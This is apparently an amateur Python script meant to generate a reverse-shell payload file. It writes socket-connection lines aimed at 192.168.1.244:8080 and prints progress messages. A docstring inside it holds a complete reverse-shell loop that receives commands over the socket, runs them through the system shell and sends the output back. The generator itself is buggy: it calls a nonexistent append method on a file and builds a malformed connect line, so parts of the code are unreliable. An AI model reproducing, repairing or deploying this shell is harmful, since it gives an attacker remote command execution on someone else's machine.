import socket
import time
import os
import subprocess


def generatePayload(rhost, rport):
    payload = open('payload.txt', 'w')
    payloada = open('payload.txt', 'a')
    print('Generating payload /')
    payload.write('import socket')
    payload.append('import time')
    time.sleep(0.5)
    os.system('cls')
    payload.append('import os')
    payload.append('import subprocess')
    print('Generating payload -')
    time.sleep(0.5)
    os.system('cls')
    payload.append('client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)')
    ipline = 'client.connect((, ''192.168.1.244'', ''8080'')'
    payload.append(ipline)
    '''
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect(('X.X.X.X', Port))
    while True:
        message = client.recv(1024)
        message = message.decode()
        update = subprocess.check_output(message, shell=True)
        response = update
        client.send(response)
        '''

generatePayload('192.168.1.244', '8080')
